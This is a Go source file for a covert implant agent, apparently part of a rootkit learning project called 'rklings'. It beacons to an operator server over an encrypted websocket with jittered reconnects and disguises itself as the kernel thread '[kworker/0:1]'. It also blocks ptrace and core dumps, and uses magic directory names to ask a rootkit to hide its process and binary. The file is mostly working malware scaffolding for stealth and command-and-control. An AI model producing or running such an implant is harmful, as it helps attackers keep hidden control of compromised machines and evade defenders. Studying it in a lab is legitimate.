package main
import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"io"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"sync"
	"time"
	"unsafe"

	"github.com/coder/websocket"
	"golang.org/x/crypto/hkdf"
	"golang.org/x/sys/unix"
)

//go:embed keys/agent.key
var agentPrivKey []byte

//go:embed keys/operator.pub
var operatorPubKey []byte

const (
	defaultServerAddr = "10.0.2.2:8443"
	baseDelay         = 5 * time.Second
	jitterMax         = 5 * time.Second
)

var serverAddr = envOr("RKLINGS_SERVER_ADDR", defaultServerAddr)

var (
	sharedKey     [32]byte
	agentPubBytes []byte
	writeMu       sync.Mutex
	wsConn        *websocket.Conn
)

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

var errCiphertextShort = errors.New("ciphertext too short")

func deriveKeys(privRaw, peerPubRaw []byte) (key [32]byte, id [8]byte, err error) {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(privRaw)
	if err != nil {
		return key, id, err
	}
	pub, err := curve.NewPublicKey(peerPubRaw)
	if err != nil {
		return key, id, err
	}
	secret, err := priv.ECDH(pub)
	if err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-aead")), key[:]); err != nil {
		return key, id, err
	}
	if _, err := io.ReadFull(hkdf.New(sha256.New, secret, nil, []byte("rklings-id")), id[:]); err != nil {
		return key, id, err
	}
	return
}

func sealAEAD(key [32]byte, plaintext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

func openAEAD(key [32]byte, ciphertext []byte) ([]byte, error) {
	gcm, err := newGCM(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext) < gcm.NonceSize() {
		return nil, errCiphertextShort
	}
	return gcm.Open(nil, ciphertext[:gcm.NonceSize()], ciphertext[gcm.NonceSize():], nil)
}

func newGCM(key [32]byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}

func initTransport() {
	curve := ecdh.X25519()
	priv, err := curve.NewPrivateKey(agentPrivKey)
	if err != nil {
		log.Fatalf("parse agent key: %v", err)
	}
	agentPubBytes = priv.PublicKey().Bytes()
	sharedKey, _, err = deriveKeys(agentPrivKey, operatorPubKey)
	if err != nil {
		log.Fatalf("derive keys: %v", err)
	}
}

func wsURL() string {
	scheme := "wss"
	if len(serverAddr) > 0 && (serverAddr[0] >= '0' && serverAddr[0] <= '9' || serverAddr[0] == '[') {
		scheme = "ws"
	}
	return fmt.Sprintf("%s://%s/", scheme, serverAddr)
}

func wsSend(v any) error {
	plain, err := json.Marshal(v)
	if err != nil {
		return err
	}
	ct, err := sealAEAD(sharedKey, plain)
	if err != nil {
		return err
	}
	writeMu.Lock()
	defer writeMu.Unlock()
	return wsConn.Write(context.Background(), websocket.MessageBinary, ct)
}

func wsSession() error {
	ctx := context.Background()
	conn, _, err := websocket.Dial(ctx, wsURL(), nil)
	if err != nil {
		return err
	}
	defer conn.CloseNow()
	conn.SetReadLimit(4 << 20)
	wsConn = conn

	hello, _ := json.Marshal(map[string]string{"t": "hello"})
	ct, err := sealAEAD(sharedKey, hello)
	if err != nil {
		return err
	}
	frame := append(agentPubBytes, ct...)
	if err := conn.Write(ctx, websocket.MessageBinary, frame); err != nil {
		return err
	}

	for {
		_, msg, err := conn.Read(ctx)
		if err != nil {
			return err
		}
		plain, err := openAEAD(sharedKey, msg)
		if err != nil {
			continue
		}
		var cmd Command
		if json.Unmarshal(plain, &cmd) != nil {
			continue
		}
		result := execute(cmd)
		if err := wsSend(map[string]any{"data": result}); err != nil {
			return err
		}
	}
}

func wsLoop() {
	for {
		if err := wsSession(); err != nil {
			log.Printf("ws: %v", err)
		}
		time.Sleep(jitter(delay("RKLINGS_BASE_DELAY", baseDelay), delay("RKLINGS_JITTER_MAX", jitterMax)))
	}
}

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	default:
		return fmt.Sprintf("ERR unknown command: %s", cmd.Op)
	}
}

func main() {
	// Masquerade as a kernel thread. The name fits in TASK_COMM_LEN (16 bytes).
	var name [16]byte
	copy(name[:], "[kworker/0:1]")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)

	// Prevent ptrace attach and /proc/pid/mem reads.
	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)

	// Prevent core dumps from leaking memory contents.
	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
	if os.Getenv("RKLINGS_REPORT_SECURITY") == "1" {
		var limit unix.Rlimit
		_ = unix.Getrlimit(unix.RLIMIT_CORE, &limit)
		dumpable, _ := unix.PrctlRetInt(unix.PR_GET_DUMPABLE, 0, 0, 0, 0)
		fmt.Printf("dumpable=%d core=%d\n", dumpable, limit.Cur)
		return
	}

	// Auto-hide: PID from ps, binary from ls.
	os.Mkdir(fmt.Sprintf("rklings.h.i.%d", os.Getpid()), 0)
	os.Mkdir(fmt.Sprintf("rklings.h.f.%s", filepath.Base(os.Args[0])), 0)

	initTransport()
	wsLoop()
}

func delay(name string, fallback time.Duration) time.Duration {
	value := os.Getenv(name)
	if value == "" {
		return fallback
	}
	parsed, err := time.ParseDuration(value)
	if err != nil || parsed <= 0 {
		return fallback
	}
	return parsed
}

func envOr(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

// jitter returns base + a random offset in [0, spread) using crypto/rand.
func jitter(base, spread time.Duration) time.Duration {
	var buf [8]byte
	rand.Read(buf[:])
	n := binary.LittleEndian.Uint64(buf[:])
	return base + time.Duration(n%uint64(spread))
}
